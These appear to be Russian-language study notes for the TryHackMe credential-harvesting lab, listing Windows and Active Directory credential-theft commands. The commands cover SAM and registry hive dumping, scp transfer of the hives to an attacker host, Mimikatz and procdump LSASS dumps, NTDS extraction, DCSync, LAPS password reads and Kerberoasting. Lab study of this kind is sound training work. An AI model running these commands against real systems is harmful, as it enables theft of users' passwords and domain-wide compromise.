```http
https://tryhackme.com/room/credharvesting
```
___
# Доступ к учетным данным
```http
https://attack.mitre.org/tactics/TA0006/
```

Учетные данные хранятся небезопасно в различных местах систем:
- Файлы с открытым текстом
```ps
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
```ps
reg query HKLM /f password /t REG_SZ /s
#OR
reg query HKCU /f password /t REG_SZ /s
```
- Файлы базы данных
- Память
- Менеджеры паролей
- Корпоративные хранилища
- Активный каталог
- Сетевой сниффинг
___

```bash
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```
---
# Локальные учетные данные Windows
### HashDump Metasploit
```bash
meterpreter > getuid Server username: THM\Administrator meterpreter > hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d::: CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d:::
```
### Служба теневого копирования томов
1. Запустите стандартную командную строку cmd.exe с правами администратора.
2. Выполните команду wmic, чтобы создать теневую копию диска C:
3. Убедитесь, что создание, созданное на шаге 2, доступно.
4. Скопируйте базу данных SAM с тома, созданного на шаге 2.
```cmd
wmic shadowcopy call create Volume='C:\'
```

```cmd
vssadmin list shadows
```
```results
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```
Вывод показывает, что мы успешно создали теневую копию тома (C:) со следующим путем: `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`.

База данных SAM зашифрована с помощью алгоритмов шифрования [RC4](https://en.wikipedia.org/wiki/RC4) или [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) . Для того, чтобы расшифровать ее, нам нужен ключ дешифрования, который также хранится в файловой системе в `c:\Windows\System32\Config\system`.

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam

\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```
___
### Реестр ульев
 Реестр Windows также хранит копию некоторого содержимого базы данных SAM для использования службами Windows. К счастью, мы можем сохранить значение реестра Windows с помощью инструмента reg.exe. Как упоминалось ранее, нам нужны два файла для расшифровки содержимого базы данных SAM. Убедитесь, что вы запускаете командную строку с правами администратора.

```cmd
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```

```http
https://github.com/roo7break/impacket/blob/master/examples/secretsdump.py
```

```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```

___
```cmd
net user thm
```

```bash
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```

```ps
scp C:\users\Administrator\Desktop\sam-reg vadim@10.9.0.252:/tmp/
scp C:\users\Administrator\Desktop\system-reg vadim@10.9.0.252:/tmp/
```

```!!!
wget https://raw.githubusercontent.com/roo7break/impacket/refs/heads/master/examples/secretsdump.py && chmod +x secretsdump.py 
python -m venv venv
 pip2 install impacket 
source venv/bin/activate
python2 secretsdump.py -system system-reg -sam sam-reg LOCAL
```

```bash
impacket-secretsdump -system /tmp/system-reg -sam /tmp/sam-reg LOCAL
```
### Служба подсистемы местного органа безопасности (LSASS)
Local Security Authority Server Service (LSASS) — это процесс Windows, который обрабатывает политику безопасности операционной системы и применяет ее в системе. Он проверяет учетные записи, вошедшие в систему, и обеспечивает пароли, хэши и билеты Kerberos .
#### GUI
```regedit.exe
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa -> RunAsPPL = 0
```

#### Sysinternals Suite
ProcDump — это утилита дампа процесса Sysinternals, которая запускается из командной строки.
```ps
procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
```

#### Mimikatz
Mimikatz  — это инструмент пост-эксплуатации, который позволяет использовать  другие полезные атаки , такие как  pass-the-hash, pass-the-ticket или создание билетов Golden Kerberos . Mimikatz работает с памятью операционной системы для доступа к информации. Таким образом,  для дампа памяти и извлечения учетных данных требуются права администратора и системы.

```ps
privilege::debug
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```
___
# Диспетчер учетных данных Windows
### Credential Manager
```powershell
vaultcmd /list
VaultCmd /listproperties:"Web Credentials"
VaultCmd /listcreds:"Web Credentials"
```

### Сброс учетных данных
```http
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
```

```bash
powershell -ex bypass
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
```

### Запустить как
RunAs — это встроенный инструмент командной строки, который позволяет запускать приложения или инструменты Windows с разрешениями разных пользователей.
Аргумент `/savecred`позволяет вам сохранять учетные данные пользователя в диспетчере учетных данных Windows (в разделе «Учетные данные Windows»). Таким образом, в следующий раз, когда мы выполним команду от имени того же пользователя, runas не будет запрашивать пароль.

```powershell
cmdkey /list
runas /savecred /user:THM.red\thm-local cmd.exe
```

```mimikatz
sekurlsa::credman
```
___
# Контроллер домена
NTDS по умолчанию находится в `C:\Windows\NTDS`и зашифрован, чтобы предотвратить извлечение данных с целевой машины. Доступ к файлу NTDS.dit с работающей машины запрещен, так как файл используется Active Directory и заблокирован.
## Ntdsutil
Ntdsutil — это утилита Windows, используемая для управления и поддержки конфигураций Active Directory.
```cmd
C:\Windows\NTDS\ntds.dit
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
```

```Сброс содержимого файла NTDS с машины-жертвы
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

```bash
secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```
## DC Sync
```bash
secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.111.45
```
___
# Решение для пароля локального администратора (LAPS)
### Настройки групповой политики (GPP)
GPP — это инструмент, позволяющий администраторам создавать политики домена со встроенными учетными данными.  После развертывания GPP в папке SYSVOL создаются различные файлы XML . SYSVOL — это важный компонент Active Directory, который создает общий каталог на томе NTFS, к которому все аутентифицированные пользователи домена могут получить доступ с разрешением на чтение.
Проблема заключалась в том, что соответствующие GPP XML- файлы содержали пароль, зашифрованный с помощью шифрования AES -256 бит. В то время шифрование было достаточно хорошим, пока Microsoft каким-то образом не опубликовала свой закрытый ключ на [MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) . Поскольку пользователи домена могут читать содержимое папки SYSVOL, становится легко расшифровать сохраненные пароли. Одним из инструментов для взлома зашифрованного пароля SYSVOL является  
```http
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
```

### Перечислить для LAPS
В 2015 году Microsoft удалила хранение зашифрованного пароля в папке SYSVOL. Она представила Local Administrator Password Solution (LAPS), который предлагает гораздо более безопасный подход к удаленному управлению паролем локального администратора.

Новый метод включает два новых атрибута (ms-mcs-AdmPwd и ms-mcs-AdmPwdExpirationTime) объектов компьютера в Active Directory.  Атрибут `ms-mcs-AdmPwd`содержит открытый текстовый пароль локального администратора, а `ms-mcs-AdmPwdExpirationTime`содержит время истечения срока действия для сброса пароля. LAPS использует `admpwd.dll`для изменения пароля локального администратора и обновления значения `ms-mcs-AdmPwd`.

```powershell
dir "C:\Program Files\LAPS\CSE"
```
Доступные команды для использования в `AdmPwd`командлетах следующим образом
```powershell
Get-Command *AdmPwd*
```
Обратите внимание, что получение доступных OU может быть выполнено на этапе перечисления. Наша цель OU в этом примере — `THMorg`. Вы можете использовать  `-Identity *`  аргумент для получения списка всех доступных OU.
```powershell
Find-AdmPwdExtendedRights -Identity THMorg
```

```powershell
net groups "THMGroupReader"
```

```powershell
Get-AdmPwdPassword -ComputerName creds-harvestin
```

___
# Kerberoasting
Kerberoasting — это распространенная атака AD для получения билетов AD , которая помогает с сохранением . Чтобы эта атака сработала, злоумышленник должен иметь доступ к учетным записям SPN  (Service Principal Name)  , таким как IIS User, MSSQL и т. д. Атака Kerberoasting включает запрос билета на предоставление билетов ( TGT ) и службы предоставления билетов (TGS).
```bash
impacket-GetUserSPNs -dc-ip 10.10.143.7 THM.red/thm
```

```bash
impacket-GetUserSPNs -dc-ip 10.10.143.7 THM.red/thm -request-user svc-thm
```

```bash
hashcat -m 13100 /tmp/hash /usr/share/wordlists/rockyou.txt 
```
___

```http
https://github.com/SnaffCon/Snaffler
https://github.com/GhostPack/Seatbelt
```

